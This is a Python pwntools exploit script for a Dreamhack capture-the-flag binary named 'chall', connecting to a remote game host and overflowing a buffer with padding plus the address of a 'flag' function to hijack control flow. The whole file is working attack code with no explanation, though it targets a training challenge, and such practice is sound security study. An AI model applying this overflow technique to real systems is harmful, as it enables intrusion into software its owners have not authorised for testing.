#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 17971)

    return p

def main():
    p = conn()

    input()

    p.sendafter(b'Menu: ', b'cherry' + b'a'*6 + b'\x22')
    p.sendafter(b'cherry?: ', b'a'*26 + p64(exe.sym['flag']))

    p.interactive()

if __name__ == "__main__":
    main()